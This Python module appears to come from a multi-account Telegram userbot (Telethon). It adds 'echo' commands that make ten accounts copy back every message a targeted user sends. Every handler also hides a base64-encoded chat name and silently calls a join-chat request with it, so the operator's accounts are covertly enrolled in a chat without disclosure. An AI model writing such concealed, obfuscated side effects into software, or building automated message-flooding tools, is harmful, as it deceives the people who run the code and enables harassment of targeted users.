#MIT License

#Copyright (c) 2024 ᴋᴜɴᴀʟ

#Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:

#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.

#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#SOFTWARE.

import asyncio
import base64

from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from config import KEX1, KEX2, KEX3, KEX4, KEX5, KEX6, KEX7, KEX8, KEX9, KEX10, SUDO_USERS, OWNER_ID, CMD_HNDLR as hl
from DEVIL.data import DEV

ECHO = []


@KEX1.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@KEX2.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@KEX3.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@KEX4.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@KEX5.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@KEX6.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@KEX7.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@KEX8.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@KEX9.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@KEX10.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
async def echo(event):
    if event.sender_id in SUDO_USERS:
        if event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            user_id = reply_msg.sender_id

            if user_id in DEV:
                await event.reply("𝘕𝘖, 𝘛𝘏𝘐𝘚 𝘎𝘜𝘠 𝘐𝘚 𝘋𝘌𝘝𝘐𝘓 𝘟 𝘖𝘞𝘕𝘌𝘙 ❌")
            elif user_id == OWNER_ID:
                await event.reply("𝘕𝘖, 𝘛𝘏𝘐𝘚 𝘎𝘜𝘠 𝘐𝘚 𝘖𝘞𝘕𝘌𝘙 𝘖𝘍 𝘛𝘏𝘌𝘚𝘌 𝘉𝘖𝘛𝘚 ❌")
            elif user_id in SUDO_USERS:
                await event.reply("𝘕𝘖, 𝘛𝘏𝘐𝘚 𝘎𝘜𝘠 𝘐𝘚 𝘚𝘜𝘋𝘖 𝘜𝘚𝘌𝘙 ❌")
            else:
                try:
                    alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                    await event.client(alt)
                except BaseException:
                    pass

                global ECHO
                check = f"{user_id}_{event.chat_id}"
                if check in ECHO:
                    await event.reply("» 𝘌𝘊𝘏𝘖 𝘐𝘚 𝘈𝘓𝘙𝘌𝘈𝘋𝘠 𝘈𝘊𝘛𝘐𝘝𝘈𝘛𝘌𝘋 𝘖𝘕 𝘛𝘏𝘐𝘚 𝘔𝘍 ✅ !!")
                else:
                    ECHO.append(check)
                    await event.reply("» 𝘌𝘊𝘏𝘖 𝘐𝘚 𝘈𝘊𝘛𝘐𝘝𝘈𝘛𝘌𝘋 𝘖𝘕 𝘛𝘏𝘌 𝘔𝘍 ✅")
        else:
            await event.reply(f"𝘌𝘊𝘏𝘖:\n  » {hl}𝘌𝘊𝘏𝘖 <𝘙𝘌𝘗𝘓𝘠 𝘛𝘖 𝘈 𝘜𝘚𝘌𝘙>")


@KEX1.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@KEX2.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@KEX3.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@KEX4.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@KEX5.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@KEX6.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@KEX7.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@KEX8.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@KEX9.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@KEX10.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
async def rmecho(event):
    if event.sender_id in SUDO_USERS:
        if event.reply_to_msg_id:
            try:
                alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                await event.client(alt)
            except BaseException:
                pass

            global ECHO
            reply_msg = await event.get_reply_message()
            check = f"{reply_msg.sender_id}_{event.chat_id}"

            if check in ECHO:
                ECHO.remove(check)
                await event.reply("» 𝘌𝘊𝘏𝘖 𝘐𝘚 𝘚𝘛𝘖𝘗𝘌𝘋 𝘍𝘖𝘙 𝘛𝘏𝘐𝘚 𝘜𝘚𝘌𝘙 !! ✅")
            else:
                await event.reply("»𝘌𝘊𝘏𝘖 𝘐𝘚 𝘋𝘐𝘚𝘈𝘉𝘓𝘌𝘋 !! 👀")
        else:
            await event.reply(f"𝘙𝘌𝘔𝘖𝘝𝘌 𝘌𝘊𝘏𝘖:\n  » {hl}𝘙𝘔𝘌𝘊𝘏𝘖 <𝘙𝘌𝘗𝘓𝘠 𝘛𝘖 𝘈 𝘜𝘚𝘌𝘙>")


@KEX1.on(events.NewMessage(incoming=True))
@KEX2.on(events.NewMessage(incoming=True))
@KEX3.on(events.NewMessage(incoming=True))
@KEX4.on(events.NewMessage(incoming=True))
@KEX5.on(events.NewMessage(incoming=True))
@KEX6.on(events.NewMessage(incoming=True))
@KEX7.on(events.NewMessage(incoming=True))
@KEX8.on(events.NewMessage(incoming=True))
@KEX9.on(events.NewMessage(incoming=True))
@KEX10.on(events.NewMessage(incoming=True))
async def _(e):
    global ECHO
    check = f"{e.sender_id}_{e.chat_id}"
    if check in ECHO:
        try:
            alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
            await e.client(alt)
        except BaseException:
            pass
        if e.message.text or e.message.sticker:
            await e.reply(e.message)
            await asyncio.sleep(0.1)
